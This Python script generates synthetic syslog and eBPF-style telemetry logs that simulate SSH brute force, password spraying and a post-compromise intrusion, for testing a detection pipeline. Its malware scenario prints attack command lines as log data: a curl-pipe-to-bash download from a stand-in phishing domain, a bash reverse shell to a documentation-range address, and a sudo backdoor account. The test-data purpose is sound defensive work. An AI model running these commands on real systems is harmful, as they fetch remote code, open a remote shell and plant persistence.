#!/usr/bin/env python3
"""eventgen: synthetic raw logs for testing and demonstrating the pipeline.

Prints raw input for logpipe: syslog lines for authentication activity and
JSON lines shaped like ebpf-telemetry output for process and network activity.
Nothing here touches a real system, and all "malicious" addresses come from
the RFC 5737 documentation ranges.

    python3 generate.py --scenario attack_chain | logpipe | python3 sigma-lite/main.py
"""

from __future__ import annotations

import argparse
import json
import random
from datetime import datetime, timedelta, timezone

HOSTS = ["prod-server", "db-01", "bastion-host", "workstation-05"]
PROCESSES = ["sshd", "sudo", "kernel", "systemd"]

SPRAY_USERS = [
    "admin", "root", "ubuntu", "user", "test",
    "guest", "deploy", "backup", "oracle", "postgres",
]

# These three also appear in tools/ioc-feed/samples/feed.stix.json.
SCANNER_IP = "203.0.113.99"
C2_IP = "198.51.100.42"
PHISHING_DOMAIN = "evil-login.example.net"


class Clock:
    """Hands out increasing timestamps so a scenario reads like a timeline."""

    def __init__(self) -> None:
        self.now = datetime.now(timezone.utc).replace(microsecond=0)

    def tick(self, seconds: int = 0) -> datetime:
        self.now += timedelta(seconds=seconds)
        return self.now


def syslog(clock: Clock, host: str, proc: str, message: str, pid: int | None = None) -> str:
    stamp = clock.tick().strftime("%b %d %H:%M:%S")
    tag = f"{proc}[{pid if pid is not None else random.randint(300, 9999)}]"
    return f"{stamp} {host} {tag}: {message}"


def ebpf(clock: Clock, host: str, kind: str, user: str, process: dict, network: dict | None = None) -> str:
    event = {
        "event": {"time": clock.tick().isoformat().replace("+00:00", "Z"), "source": "ebpf", "kind": kind},
        "host": {"name": host},
        "severity": "low",
        "user": {"name": user},
        "process": process,
    }
    if network:
        event["network"] = network
    return json.dumps(event, separators=(",", ":"))


def normal(clock: Clock, count: int) -> list[str]:
    return [
        syslog(clock, random.choice(HOSTS), random.choice(PROCESSES), "Connection closed by 10.0.0.5 port 22 [preauth]")
        for _ in range(count)
    ]


def brute_force(clock: Clock, count: int) -> list[str]:
    return [
        syslog(clock, "prod-server", "sshd", "Failed password for root from 192.168.1.66 port 22 ssh2")
        for _ in range(count)
    ]


def password_spray(clock: Clock, count: int) -> list[str]:
    return [
        syslog(clock, "prod-server", "sshd", f"Failed password for {SPRAY_USERS[i % len(SPRAY_USERS)]} from 10.0.0.99 port 22 ssh2")
        for i in range(count)
    ]


def impossible_travel(clock: Clock, count: int) -> list[str]:
    return [
        syslog(clock, "prod-server", "sshd", f"Accepted password for alice from {'1.1.1.1' if i % 2 == 0 else '2.2.2.2'} port 22 ssh2")
        for i in range(count)
    ]


def root_login(clock: Clock, count: int) -> list[str]:
    return [
        syslog(clock, "prod-server", "sshd", "Accepted password for root from 192.168.1.66 port 22 ssh2")
        for _ in range(count)
    ]


def sudo_shell(clock: Clock, count: int) -> list[str]:
    return [
        syslog(clock, "prod-server", "sudo", "   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash")
        for _ in range(count)
    ]


def ioc_scan(clock: Clock, count: int) -> list[str]:
    """SSH guesses from an address that is listed in the sample threat feed."""
    return [
        syslog(clock, "bastion-host", "sshd", f"Failed password for invalid user {SPRAY_USERS[i % len(SPRAY_USERS)]} from {SCANNER_IP} port 22 ssh2")
        for i in range(count)
    ]


def malware(clock: Clock, count: int) -> list[str]:
    """Post-compromise activity as ebpf-telemetry would report it."""
    lines: list[str] = []
    for i in range(count):
        base = 6000 + i * 10
        host, user = "prod-server", "root"
        lines += [
            ebpf(clock, host, "process_start", user,
                 {"name": "bash", "pid": base, "parent_pid": 4821, "command_line": f"sh -c curl -fsSL http://{PHISHING_DOMAIN}/stage1.sh | bash"}),
            ebpf(clock, host, "process_start", user,
                 {"name": "agent", "pid": base + 1, "parent_pid": base, "command_line": "/tmp/.cache/agent --daemon"}),
            ebpf(clock, host, "network_connection", user,
                 {"name": "agent", "pid": base + 1},
                 {"src_ip": "10.0.0.20", "dst_ip": C2_IP, "dst_port": 4444, "protocol": "tcp"}),
            ebpf(clock, host, "process_start", user,
                 {"name": "bash", "pid": base + 2, "parent_pid": base + 1, "command_line": f"bash -c bash -i >& /dev/tcp/{C2_IP}/4444 0>&1"}),
            ebpf(clock, host, "process_start", user,
                 {"name": "useradd", "pid": base + 3, "parent_pid": base + 2, "command_line": "useradd -m -s /bin/bash -G sudo svc-backup"}),
        ]
    return lines


def attack_chain(clock: Clock, count: int) -> list[str]:
    """One intrusion from first scan to persistence, with background noise."""
    lines: list[str] = []
    for _ in range(count):
        lines += normal(clock, 5)
        lines += ioc_scan(clock, 8)
        clock.tick(30)
        lines += brute_force(clock, 10)
        lines += root_login(clock, 1)
        clock.tick(20)
        lines += impossible_travel(clock, 2)
        lines += normal(clock, 5)
        clock.tick(15)
        lines += sudo_shell(clock, 1)
        lines += malware(clock, 1)
        clock.tick(120)
    return lines


SCENARIOS = {
    "normal": normal,
    "brute_force": brute_force,
    "password_spray": password_spray,
    "impossible_travel": impossible_travel,
    "root_login": root_login,
    "sudo_shell": sudo_shell,
    "ioc_scan": ioc_scan,
    "malware": malware,
    "attack_chain": attack_chain,
}


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate synthetic raw logs for logpipe.")
    parser.add_argument("--scenario", choices=sorted(SCENARIOS), default="normal")
    parser.add_argument("--count", type=int, default=1, help="number of events (or repetitions for malware and attack_chain)")
    parser.add_argument("--seed", type=int, help="seed for repeatable output")
    args = parser.parse_args()

    if args.seed is not None:
        random.seed(args.seed)

    for line in SCENARIOS[args.scenario](Clock(), args.count):
        print(line)


if __name__ == "__main__":
    main()
